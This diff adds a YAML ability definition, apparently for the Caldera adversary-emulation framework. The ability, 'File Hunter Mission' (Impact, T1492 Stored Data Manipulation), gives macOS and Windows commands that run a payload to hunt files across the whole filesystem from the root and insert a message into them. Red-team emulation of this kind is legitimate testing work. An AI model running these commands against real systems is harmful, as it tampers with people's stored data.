@@ -1,0 +1,21 @@
+---
+
+- id: 55f9600a-756f-496b-b27f-682052dc429c
+  name: File Hunter Mission
+  description: Hunts for files of a certain extension and inserts a message
+  tactic: Impact
+  technique:
+    attack_id: T1492
+    name: Stored Data Manipulation
+  platforms:
+    darwin:
+      sh:
+        command: |
+          ./mission.go -server #{server} -duration 60 -message 'caldera wuz here' -dir '/'
+        payload: mission.go
+    windows:
+      psh:
+        command: |
+           mv mission.go mission.exe;
+           .\mission.exe -server #{server} -duration 60 -message 'caldera wuz here' -dir 'C:\';
+        payload: mission.go
